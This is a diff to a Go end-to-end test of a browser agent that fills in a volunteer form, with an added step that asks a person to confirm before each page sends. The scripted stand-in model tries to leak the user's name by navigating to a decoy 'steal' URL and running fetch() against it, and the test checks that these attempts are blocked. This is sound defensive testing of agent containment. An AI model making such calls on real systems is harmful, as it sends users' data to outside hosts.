@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -52,8 +53,10 @@ func TestE2EAct_FillsAForm(t *testing.T) {
 		t.Fatalf("heedle compile: %v\n%s", err, compiled.String())
 	}
 	claude := standInClaude(t, decoyIP)
+	var asked []pirn.ActPending
 	act := pirn.Act{Claude: pirn.Claude{APIKey: "stand-in", BaseURL: claude.URL},
-		Browser: pirn.ReedBrowser{Browser: reed.Browser{Image: img, Network: network}}, Image: img}
+		Browser: pirn.ReedBrowser{Browser: reed.Browser{Image: img, Network: network}}, Image: img,
+		Confirm: func(_ context.Context, p pirn.ActPending) (bool, error) { asked = append(asked, p); return true, nil }}
 	reg := draft.DefaultRegistry()
 	var suite testsuite.WorkflowTestSuite
 	env := suite.NewTestWorkflowEnvironment()
@@ -100,22 +103,26 @@ func TestE2EAct_FillsAForm(t *testing.T) {
 			shots++
 		}
 	}
-	want := "browser_navigate browser_snapshot browser_fill_form browser_click browser_snapshot browser_select_option browser_click browser_navigate browser_navigate browser_evaluate"
+	want := "browser_navigate browser_snapshot browser_fill_form confirm browser_click browser_snapshot browser_select_option confirm browser_click browser_navigate browser_navigate browser_evaluate"
 	if strings.Join(tools, " ") != want {
 		t.Errorf("actions %q, want %q", tools, want)
 	}
-	if rec.Ended != pirn.EndedFinished || strings.Join(rec.Allowed, " ") != "forms-srv" || shots < 5 || rec.Calls[9].Output != "No such tool." ||
-		!rec.Calls[7].IsError || !rec.Calls[8].IsError || rec.BlockedTotal == 0 || !strings.Contains(strings.Join(rec.Blocked, " "), "decoy-srv") {
+	if rec.Ended != pirn.EndedFinished || strings.Join(rec.Allowed, " ") != "forms-srv" || shots < 5 || rec.Calls[11].Output != "No such tool." ||
+		!rec.Calls[9].IsError || !rec.Calls[10].IsError || rec.BlockedTotal == 0 || !strings.Contains(strings.Join(rec.Blocked, " "), "decoy-srv") {
 		t.Errorf("record: ended %s, allowed %v, %d screenshots, blocked %d %v, last calls %+v", rec.Ended, rec.Allowed, shots, rec.BlockedTotal, rec.Blocked, rec.Calls[7:])
 	}
 	// Leaving by navigation is refused before it reaches the browser
 	// (review 39); what the page itself asked for reached nothing, and the
 	// record lists it, from the first page too.
-	if !strings.HasPrefix(rec.Calls[7].Output, "Not run: this step may only open") || !strings.HasPrefix(rec.Calls[8].Output, "Not run: this step may only open") {
-		t.Errorf("navigations away: %q, %q", rec.Calls[7].Output, rec.Calls[8].Output)
+	if !strings.HasPrefix(rec.Calls[9].Output, "Not run: this step may only open") || !strings.HasPrefix(rec.Calls[10].Output, "Not run: this step may only open") {
+		t.Errorf("navigations away: %q, %q", rec.Calls[9].Output, rec.Calls[10].Output)
 	}
 	if blocked := strings.Join(rec.Blocked, " "); !strings.Contains(blocked, "/pixel.png") || rec.BlockedUnknown {
 		t.Errorf("blocked: %v (unknown %v)", rec.Blocked, rec.BlockedUnknown)
+	}
+	// Each page that sent asked first, with Claude's summary (roadmap 9.7).
+	if len(asked) != 2 || asked[0].Summary != "Ada Lovelace, ada@example.org, Saturday." || rec.HeldTotal != 0 {
+		t.Errorf("asked %+v, held %d", asked, rec.HeldTotal)
 	}
 	if rec.URL != "http://forms-srv:8080/volunteer/done" {
 		t.Errorf("the last page: %q", rec.URL)
@@ -231,24 +238,26 @@ func standInClaude(t *testing.T, decoyIP string) *httptest.Server {
 		switch step {
 		case 1:
 			block = use("browser_navigate", map[string]any{"url": "http://forms-srv:8080/volunteer"})
-		case 2, 5:
+		case 2, 6:
 			block = use("browser_snapshot", map[string]any{})
 		case 3:
 			block = use("browser_fill_form", map[string]any{"fields": []map[string]any{
 				{"name": "Name", "type": "textbox", "target": refOf(snaps, `textbox "Name"`), "value": "Ada Lovelace"},
 				{"name": "Email", "type": "textbox", "target": refOf(snaps, `textbox "Email"`), "value": "ada@example.org"},
 			}})
-		case 4:
+		case 4, 8: // each page that sends waits for a person (roadmap 9.7)
+			block = fmt.Sprintf(`{"type":"tool_use","id":"t%d","name":"confirm","input":{"summary":"Ada Lovelace, ada@example.org, Saturday."}}`, step)
+		case 5:
 			block = use("browser_click", map[string]any{"element": "Next", "target": refOf(snaps, `button "Next"`)})
-		case 6:
-			block = use("browser_select_option", map[string]any{"element": "Shift", "target": refOf(snaps, `combobox "Shift"`), "values": []string{"Saturday"}})
 		case 7:
-			block = use("browser_click", map[string]any{"element": "Submit", "target": refOf(snaps, `button "Submit"`)})
-		case 8:
-			block = use("browser_navigate", map[string]any{"url": "http://decoy-srv:8080/steal?name=Ada"})
+			block = use("browser_select_option", map[string]any{"element": "Shift", "target": refOf(snaps, `combobox "Shift"`), "values": []string{"Saturday"}})
 		case 9:
-			block = use("browser_navigate", map[string]any{"url": "http://" + decoyIP + ":8080/steal?name=Ada"})
+			block = use("browser_click", map[string]any{"element": "Submit", "target": refOf(snaps, `button "Submit"`)})
 		case 10:
+			block = use("browser_navigate", map[string]any{"url": "http://decoy-srv:8080/steal?name=Ada"})
+		case 11:
+			block = use("browser_navigate", map[string]any{"url": "http://" + decoyIP + ":8080/steal?name=Ada"})
+		case 12:
 			block = use("browser_evaluate", map[string]any{"function": "() => fetch('http://decoy-srv:8080/steal')"})
 		default:
 			block, stop = `{"type":"text","text":"Ada Lovelace is on the volunteer list for Saturday.\nResult: finished"}`, "end_turn"
